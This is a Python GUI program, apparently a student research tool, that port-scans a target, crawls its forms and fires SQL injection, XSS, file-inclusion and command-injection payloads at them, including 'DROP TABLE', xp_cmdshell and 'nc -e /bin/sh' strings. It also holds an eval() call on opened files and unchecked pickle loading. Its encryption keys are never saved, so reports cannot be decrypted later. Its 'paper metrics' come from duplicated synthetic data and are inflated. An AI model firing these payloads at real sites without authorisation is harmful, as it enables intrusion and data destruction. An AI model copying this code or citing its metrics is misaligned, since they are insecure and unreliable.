import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import time
from threading import Thread
import requests
import os
import random
import socket
import pickle
import pandas as pd
import warnings
import pkgutil
if not hasattr(pkgutil, 'get_loader'):
    import importlib
    def get_loader(module_name):
        try:
            return importlib.util.find_spec(module_name).loader
        except:
            return None
    pkgutil.get_loader = get_loader
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
warnings.filterwarnings("ignore")
try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False
    print("[!] python-nmap not installed. Network scanning disabled.")
try:
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.lib.enums import TA_CENTER, TA_JUSTIFY
    from reportlab.lib.colors import HexColor, black, darkred, orange
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False
    print("[!] reportlab not installed. PDF export disabled.")
class CryptoEngine:
    def __init__(self):
        self.private_key = None
        self.public_key = None
        self.generate_keys()
    def generate_keys(self):
        """Generates RSA Public/Private key pair."""
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        self.public_key = self.private_key.public_key()
    def encrypt_data(self, data_text):
        aes_key = os.urandom(32)
        iv = os.urandom(16)
        padder = sym_padding.PKCS7(128).padder()
        padded_data = padder.update(data_text.encode('utf-8')) + padder.finalize()
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        encrypted_content = encryptor.update(padded_data) + encryptor.finalize()

        # Encrypt Key (RSA)
        encrypted_key = self.public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        return {
            'enc_key': encrypted_key.hex(),
            'iv': iv.hex(),
            'content': encrypted_content.hex()
        }

    def decrypt_data(self, encrypted_data):
        """Decrypt hybrid encrypted data using private key."""
        try:
            # Decrypt AES key
            aes_key = self.private_key.decrypt(
                bytes.fromhex(encrypted_data['enc_key']),
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            # Decrypt content
            iv = bytes.fromhex(encrypted_data['iv'])
            cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
            decryptor = cipher.decryptor()
            decrypted_padded = decryptor.update(bytes.fromhex(encrypted_data['content'])) + decryptor.finalize()
            
            # Unpad
            unpadder = sym_padding.PKCS7(128).unpadder()
            decrypted = unpadder.update(decrypted_padded) + unpadder.finalize()
            
            return decrypted.decode('utf-8')
        except Exception as e:
            return f"[Decryption Error] {e}"

# ==========================================
# MODULE 2: REAL MACHINE LEARNING ENGINE
# ==========================================
class MLEngine:
    def __init__(self):
        self.model = None
        self.vectorizer = None
        self.model_path = 'aegis_rf_model.pkl'
        self.vec_path = 'aegis_vectorizer.pkl'

    def create_dummy_dataset(self):
        """Generates a synthetic dataset for demonstration/baseline if no CSV exists."""
        data = {
            'request': [
                "SELECT * FROM users", "UNION SELECT 1,2", "<script>alert(1)</script>", 
                "home.php?id=1", "DROP TABLE users", "admin' --", "1' OR '1'='1", 
                "Hello world", "Contact us page", "search=laptop", "order=desc"
            ] * 50,
            'label': [0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0] * 50  # 0=Safe, 1=Malicious
        }
        df = pd.DataFrame(data)
        df.to_csv('training_data.csv', index=False)
        return 'training_data.csv'

    def train_model(self, log_callback):
        """Trains the model and returns performance metrics for the IEEE paper."""
        dataset = 'training_data.csv'
        if not os.path.exists(dataset):
            log_callback("[!] No dataset found. Generating synthetic dataset for baseline...")
            self.create_dummy_dataset()

        log_callback(f"[...] Training Random Forest Model on {dataset}...")
        
        try:
            df = pd.read_csv(dataset)
            # TF-IDF Vectorization (Converting text to numbers)
            self.vectorizer = TfidfVectorizer(max_features=1000)
            X = self.vectorizer.fit_transform(df['request'].astype(str))
            y = df['label']

            # Split Data (80% Train, 20% Test)
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)

            # Train Model
            self.model = RandomForestClassifier(n_estimators=100, random_state=42)
            self.model.fit(X_train, y_train)

            # Evaluate (Metrics for Paper)
            preds = self.model.predict(X_test)
            report = classification_report(y_test, preds)
            acc = accuracy_score(y_test, preds)

            # Save Model
            with open(self.model_path, 'wb') as f: pickle.dump(self.model, f)
            with open(self.vec_path, 'wb') as f: pickle.dump(self.vectorizer, f)

            return f"[+] Training Complete.\nAccuracy: {acc:.4f}\n\nMETRICS FOR PAPER:\n{report}"

        except Exception as e:
            return f"[-] Training Error: {e}"

    def load_model(self):
        try:
            with open(self.model_path, 'rb') as f: self.model = pickle.load(f)
            with open(self.vec_path, 'rb') as f: self.vectorizer = pickle.load(f)
            return True
        except:
            return False

    def predict_anomaly(self, response_text):
        """Uses the ML model to detect if a response looks malicious/anomalous."""
        if not self.model or not self.vectorizer:
            return False, 0.0
        
        try:
            vec = self.vectorizer.transform([response_text[:5000]])  # Limit length
            prob = self.model.predict_proba(vec)[0][1] if hasattr(self.model, 'predict_proba') else 0.0
            
            is_threat = prob > 0.5 
            return is_threat, prob
        except:
            return False, 0.0

# ==========================================
# MODULE 3: PAYLOAD GENERATOR
# ==========================================
def ai_generate_payloads(vuln_type):
    """Simulates Advanced Payload Generation."""
    if vuln_type == "SQLi":
        return [
            "' OR 1=1 --", 
            "admin'--",
            "1' UNION SELECT NULL, version()--",
            "' OR '1'='1",
            "1'; DROP TABLE users--",
            "' UNION SELECT 1,2,3--",
            "'; EXEC xp_cmdshell('dir')--"
        ]
    elif vuln_type == "XSS":
        return [
            "<script>alert('Aegis')</script>",
            "<img src=x onerror=alert(1)>",
            "'\"><svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert('XSS')>",
            "'';!--\"<XSS>=&{()}"
        ]
    elif vuln_type == "LFI":
        return [
            "../../../etc/passwd",
            "../../../../windows/win.ini",
            "/etc/passwd",
            "C:\\boot.ini"
        ]
    elif vuln_type == "RCE":
        return [
            "; ls",
            "| dir",
            "&& whoami",
            "| nc -e /bin/sh"
        ]
    return []

# ==========================================
# MAIN APPLICATION
# ==========================================
class VulnerabilityScannerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        
        self.title("Aegis AI Scanner - Research Edition v2.0")
        self.geometry("1200x900")
        
        # Initialize Engines
        self.crypto = CryptoEngine()
        self.ml_engine = MLEngine()
        
        # Theme Colors
        self.bg_color = "#2E3440"
        self.fg_color = "#ECEFF4"
        self.frame_bg = "#3B4252"
        self.widget_bg = "#434C5E"
        self.accent_color = "#88C0D0"
        self.button_bg = "#5E81AC"
        self.success_color = "#A3BE8C"
        self.warning_color = "#EBCB8B"
        self.danger_color = "#BF616A"
        
        self.configure(background=self.bg_color)
        self.style = ttk.Style(self)
        self.style.theme_use('clam')
        self._configure_styles()
        
        # Data
        self.vulnerabilities = []
        self.network_results = {}
        self.scanned_urls = set()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Aegis-AI-Scanner/Research-v2',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })

        self.create_widgets()
        self.log("[+] Aegis AI Scanner initialized successfully.")
        self.log("[+] Crypto Engine: RSA-2048 + AES-256 ready.")
        
    def _configure_styles(self):
        self.style.configure('.', background=self.bg_color, foreground=self.fg_color, font=('Segoe UI', 10))
        self.style.configure('TFrame', background=self.bg_color)
        self.style.configure('Dark.TFrame', background=self.frame_bg)
        self.style.configure('Title.TLabel', background=self.bg_color, font=('Segoe UI', 22, "bold"), foreground=self.accent_color)
        self.style.configure('TButton', background=self.button_bg, foreground="white", font=('Segoe UI', 10, 'bold'), borderwidth=0)
        self.style.map('TButton', background=[('active', self.accent_color)])

    def create_widgets(self):
        # Header
        header = ttk.Frame(self, padding="15")
        header.pack(fill=tk.X)
        ttk.Label(header, text="Aegis AI Scanner (Research Edition v2.0)", style='Title.TLabel').pack()
        ttk.Label(header, text="Advanced Vulnerability Detection with Machine Learning & Hybrid Encryption", 
                  background=self.bg_color, foreground=self.accent_color, font=('Segoe UI', 10)).pack()

        # Input & Controls
        control_frame = ttk.Frame(self, style='Dark.TFrame', padding=15)
        control_frame.pack(fill=tk.X, padx=15, pady=5)
        
        ttk.Label(control_frame, text="Target URL:", background=self.frame_bg, font=('Segoe UI', 10, 'bold')).grid(row=0, column=0, padx=5, sticky='w')
        self.url_entry = ttk.Entry(control_frame, width=60, font=('Segoe UI', 10))
        self.url_entry.grid(row=0, column=1, padx=5, sticky='ew')
        self.url_entry.insert(0, "http://testphp.vulnweb.com")

        # Buttons
        self.btn_scan = ttk.Button(control_frame, text="Start Scan", command=self.start_scan_thread)
        self.btn_scan.grid(row=0, column=2, padx=5)

        self.btn_train = ttk.Button(control_frame, text="Train AI Model", command=self.start_training_thread)
        self.btn_train.grid(row=0, column=3, padx=5)

        self.btn_decrypt = ttk.Button(control_frame, text="Decrypt Report", command=self.decrypt_report)
        self.btn_decrypt.grid(row=0, column=4, padx=5)

        # Progress
        self.progress = ttk.Progressbar(control_frame, mode='determinate', length=200)
        self.progress.grid(row=0, column=5, padx=10)

        # Tabs
        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)

        # Log Tab
        log_frame = ttk.Frame(notebook, style='Dark.TFrame')
        self.log_text = scrolledtext.ScrolledText(log_frame, bg=self.widget_bg, fg=self.fg_color, font=('Consolas', 10))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        notebook.add(log_frame, text="Live Logs & AI Metrics")

        # Report Tab
        report_frame = ttk.Frame(notebook, style='Dark.TFrame')
        self.report_text = scrolledtext.ScrolledText(report_frame, bg=self.widget_bg, fg=self.fg_color, font=('Segoe UI', 11))
        self.report_text.pack(fill=tk.BOTH, expand=True)
        notebook.add(report_frame, text="Scan Report")

        # Vulnerabilities Tab
        vuln_frame = ttk.Frame(notebook, style='Dark.TFrame')
        self.vuln_tree = ttk.Treeview(vuln_frame, columns=('Type', 'URL', 'Param', 'Confidence'), show='headings')
        self.vuln_tree.heading('Type', text='Type')
        self.vuln_tree.heading('URL', text='URL')
        self.vuln_tree.heading('Param', text='Parameter')
        self.vuln_tree.heading('Confidence', text='AI Confidence')
        self.vuln_tree.pack(fill=tk.BOTH, expand=True)
        notebook.add(vuln_frame, text="Vulnerabilities")

        # Footer
        footer = ttk.Frame(self, padding=10, style='Dark.TFrame')
        footer.pack(fill=tk.X, padx=15, pady=5)
        
        self.status_label = ttk.Label(footer, text="Ready", background=self.frame_bg, foreground=self.accent_color)
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        self.btn_export = ttk.Button(footer, text="Export Encrypted PDF", command=self.export_report, state='disabled')
        self.btn_export.pack(side=tk.RIGHT, padx=5)

    # --- LOGGING ---
    def log(self, msg):
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_text.see(tk.END)
        self.status_label.config(text=msg[:50])

    # --- AI TRAINING ---
    def start_training_thread(self):
        t = Thread(target=self.run_training)
        t.daemon = True
        t.start()

    def run_training(self):
        self.btn_train.config(state='disabled')
        self.log("=== STARTING AI MODEL TRAINING ===")
        self.log("Objective: Establish baseline metrics for IEEE paper.")
        
        result = self.ml_engine.train_model(self.log)
        self.log(result)
        
        self.log("=== TRAINING COMPLETE ===")
        self.log("TIP: Screenshot the metrics above for your 'Results' section.")
        self.btn_train.config(state='normal')

    # --- SCANNING ---
    def start_scan_thread(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showwarning("Warning", "Please enter a target URL.")
            return
        self.btn_scan.config(state='disabled')
        self.vulnerabilities = []
        self.progress['value'] = 0
        
        t = Thread(target=self.run_scan, args=(url,))
        t.daemon = True
        t.start()

    def run_scan(self, url):
        self.log(f"=== STARTING SCAN: {url} ===")
        
        # 1. Load AI Model
        if not self.ml_engine.load_model():
            self.log("[!] No trained AI model found. Using heuristics only.")
            self.log("TIP: Click 'Train AI Model' first for better accuracy.")
        else:
            self.log("[+] AI Model Loaded. Anomaly detection active.")

        # 2. Network Scan (Nmap)
        if NMAP_AVAILABLE:
            try:
                hostname = urlparse(url).hostname
                target_ip = socket.gethostbyname(hostname)
                self.log(f"[*] Running Network Scan on {target_ip}...")
                nm = nmap.PortScanner()
                nm.scan(target_ip, arguments='-p 1-1000 -T4')
                self.network_results = nm[target_ip]
                open_ports = list(self.network_results.get('tcp', {}).keys())
                self.log(f"[+] Open Ports: {open_ports}")
            except Exception as e:
                self.log(f"[-] Network scan skipped: {e}")
        else:
            self.log("[!] Network scanning disabled (python-nmap not installed)")
        self.progress['value'] = 20

        # 3. Web Scan
        try:
            self.log("[*] Crawling target...")
            res = self.session.get(url, timeout=10)
            soup = BeautifulSoup(res.content, "html.parser")
            forms = soup.find_all("form")
            links = soup.find_all("a", href=True)
            self.log(f"[+] Found {len(forms)} forms and {len(links)} links.")
            self.progress['value'] = 40

            # Scan forms
            for i, form in enumerate(forms):
                action = form.get("action")
                target = urljoin(url, action)
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")

                self.log(f"[*] Testing form: {target}")

                # Test vulnerabilities
                for vuln_type in ["SQLi", "XSS", "LFI", "RCE"]:
                    payloads = ai_generate_payloads(vuln_type)
                    
                    for input_tag in inputs:
                        name = input_tag.get("name")
                        if not name: continue
                        
                        for payload in payloads[:3]:  # Limit for speed
                            data = {}
                            for k in inputs:
                                if k.get("name"):
                                    data[k.get("name")] = "test"
                            data[name] = payload
                            
                            try:
                                if method == 'post':
                                    r = self.session.post(target, data=data, timeout=5)
                                else:
                                    r = self.session.get(target, params=data, timeout=5)
                                
                                # AI ANALYSIS
                                is_threat, conf = self.ml_engine.predict_anomaly(r.text[:5000])
                                
                                # Check for obvious indicators
                                has_error = any(x in r.text.lower() for x in ['error', 'warning', 'mysql', 'sql', 'exception'])
                                payload_reflected = payload in r.text
                                
                                if is_threat or has_error or payload_reflected:
                                    vuln = {
                                        'type': vuln_type,
                                        'url': target,
                                        'param': name,
                                        'payload': payload,
                                        'confidence': round(conf, 3)
                                    }
                                    self.vulnerabilities.append(vuln)
                                    self.vuln_tree.insert('', 'end', values=(vuln_type, target, name, f"{conf:.2f}"))
                                    self.log(f"[!] VULNERABILITY: {vuln_type} (AI: {conf:.2f})")
                            except Exception as e:
                                pass
                
                self.progress['value'] = 40 + ((i+1)/len(forms) * 50)

        except Exception as e:
            self.log(f"[-] Scan Error: {e}")

        self.progress['value'] = 100
        self.generate_report()
        self.btn_scan.config(state='normal')
        self.btn_export.config(state='normal')
        self.log("=== SCAN COMPLETE ===")

    def generate_report(self):
        self.report_text.delete('1.0', tk.END)
        report = "=== AEGIS AI SCAN REPORT ===\n"
        report += f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        if self.network_results:
            report += "--- NETWORK FINDINGS ---\n"
            open_ports = list(self.network_results.get('tcp', {}).keys())
            report += f"Open Ports: {open_ports}\n\n"
        
        report += "--- WEB FINDINGS ---\n"
        if not self.vulnerabilities:
            report += "No high-confidence vulnerabilities found.\n"
        else:
            report += f"Total Vulnerabilities Found: {len(self.vulnerabilities)}\n\n"
            for v in self.vulnerabilities:
                report += f"[!] {v['type']} at {v['url']}\n"
                report += f"    Param: {v['param']} | AI Confidence: {v['confidence']:.3f}\n"
                report += f"    Payload: {v['payload']}\n"
                report += "-"*50 + "\n"
        
        self.report_text.insert(tk.END, report)

    def decrypt_report(self):
        """Decrypt an encrypted report file."""
        filename = filedialog.askopenfilename(
            title="Select Encrypted Report File",
            filetypes=[("Encrypted files", "*.aegis"), ("All files", "*.*")]
        )
        if not filename:
            return
        
        try:
            with open(filename, 'r') as f:
                encrypted_data = eval(f.read())  # Warning: eval can be dangerous
            
            decrypted = self.crypto.decrypt_data(encrypted_data)
            
            # Show decrypted content
            decrypt_window = tk.Toplevel(self)
            decrypt_window.title("Decrypted Report")
            decrypt_window.geometry("800x600")
            decrypt_window.configure(background=self.bg_color)
            
            text_area = scrolledtext.ScrolledText(decrypt_window, bg=self.widget_bg, fg=self.fg_color, font=('Consolas', 10))
            text_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            text_area.insert(tk.END, decrypted)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to decrypt: {e}")

    def export_report(self):
        if not REPORTLAB_AVAILABLE:
            messagebox.showerror("Error", "ReportLab not installed.\nInstall with: pip install reportlab")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".aegis",
            filetypes=[("Encrypted files", "*.aegis"), ("PDF files", "*.pdf"), ("All files", "*.*")]
        )
        if not filename: 
            return

        # Get Report Text
        raw_text = self.report_text.get("1.0", tk.END)
        
        # 1. ENCRYPT REPORT
        encrypted_data = self.crypto.encrypt_data(raw_text)
        self.log(f"[+] Report Encrypted. Key (RSA-Encrypted): {encrypted_data['enc_key'][:30]}...")

        # 2. Save Encrypted Data
        with open(filename, 'w') as f:
            f.write(str(encrypted_data))
        self.log(f"[+] Encrypted report saved as: {filename}")

        # 3. If PDF, also generate PDF
        if filename.endswith('.pdf'):
            try:
                doc = SimpleDocTemplate(filename, pagesize=(8.5*inch, 11*inch))
                styles = getSampleStyleSheet()
                story = []
                
                story.append(Paragraph("Aegis AI - Encrypted Security Report", styles['Title']))
                story.append(Spacer(1, 12))
                
                story.append(Paragraph("<b>Scan Summary (Plaintext):</b>", styles['Heading2']))
                story.append(Paragraph(f"Total Vulnerabilities: {len(self.vulnerabilities)}", styles['Normal']))
                story.append(Spacer(1, 12))

                story.append(Paragraph("<b>Encrypted Scan Data (AES+RSA):</b>", styles['Heading2']))
                story.append(Paragraph("The details below are encrypted. Use the Aegis Decryptor tool with your Private Key to view.", styles['Normal']))
                story.append(Spacer(1, 12))
                
                enc_hex = encrypted_data['content'][:2000]
                story.append(Paragraph(f"<font fontName='Courier' size=8>{enc_hex}...</font>", styles['Normal']))
                
                doc.build(story)
                self.log("[+] PDF report generated successfully.")
            except Exception as e:
                self.log(f"[-] PDF generation error: {e}")

        messagebox.showinfo("Success", "Encrypted report saved successfully.")

# ==========================================
# MAIN
# ==========================================
if __name__ == "__main__":
    # Print welcome message
    print("""
    ╔══════════════════════════════════════════════════╗
    ║   Aegis AI Scanner - Research Edition v2.0      ║
    ║   Advanced Vulnerability Detection with ML       ║
    ║   Hybrid Encryption (AES-256 + RSA-2048)        ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    app = VulnerabilityScannerApp()
    app.mainloop()
